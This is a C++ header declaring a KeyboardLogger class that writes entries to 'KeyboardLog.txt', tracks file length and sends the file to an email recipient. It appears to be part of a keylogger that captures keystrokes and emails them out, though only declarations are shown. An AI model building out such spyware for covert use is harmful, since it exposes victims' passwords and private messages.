#pragma once
#include <fstream>
#include <ctime>
#include <chrono>
#include "ILogger.h"
#include "Email.h"
#define FILE_NAME "KeyboardLog.txt"
class KeyboardLogger : ILogger
{
private:
	long long maxLength;
	long long currentLength;
	string emailReceiver;
	string getCurrentTime();
public:
	KeyboardLogger(long long maxLength, string emailReceiver);
	~KeyboardLogger();
	virtual void addMessage(string mes);
	virtual void clearFile();
	virtual void sendFile();
};

